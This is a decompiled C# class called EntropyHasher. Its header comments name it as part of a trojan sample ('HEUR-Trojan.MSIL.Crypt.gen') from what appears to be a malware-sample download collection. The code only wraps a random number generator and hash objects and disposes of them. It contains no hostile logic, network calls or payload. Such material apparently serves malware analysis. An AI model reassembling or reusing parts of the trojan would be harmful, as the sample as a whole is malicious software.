// Decompiled with JetBrains decompiler
// Type: EntropyHasher
// Assembly: wacYTAgLgQAjexermaa, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8B2A0664-5AE5-48FF-9B05-FC8D65B8BF2C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-31211fd1239d9e0de50a1af9ad1e71a55be0dac1e55e06444d2537caa96bd0c6.exe

using System;
using System.Collections.Generic;
using System.Security.Cryptography;

public sealed class EntropyHasher : IDisposable
{
  public RandomNumberGenerator RNG;
  public List<HashAlgorithmWrapper> HashWrappers;

  public EntropyHasher(RandomNumberGenerator RNG, HashAlgorithmWrapper HashWrapper)
  {
    this.RNG = RNG;
    this.HashWrappers = new List<HashAlgorithmWrapper>();
    this.HashWrappers.Add(HashWrapper);
  }

  public EntropyHasher(RandomNumberGenerator RNG, List<HashAlgorithmWrapper> HashWrappers)
  {
    this.RNG = RNG;
    this.HashWrappers = HashWrappers;
  }

  public void Dispose()
  {
    lock (this)
    {
      if (this.RNG != null)
      {
        try
        {
          this.RNG.Dispose();
        }
        catch
        {
        }
        this.RNG = (RandomNumberGenerator) null;
      }
      if (this.HashWrappers == null)
        return;
      try
      {
        foreach (HashAlgorithmWrapper hashWrapper in this.HashWrappers)
        {
          try
          {
            hashWrapper.Dispose();
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
      this.HashWrappers = (List<HashAlgorithmWrapper>) null;
    }
  }

  ~EntropyHasher() => this.Dispose();
}
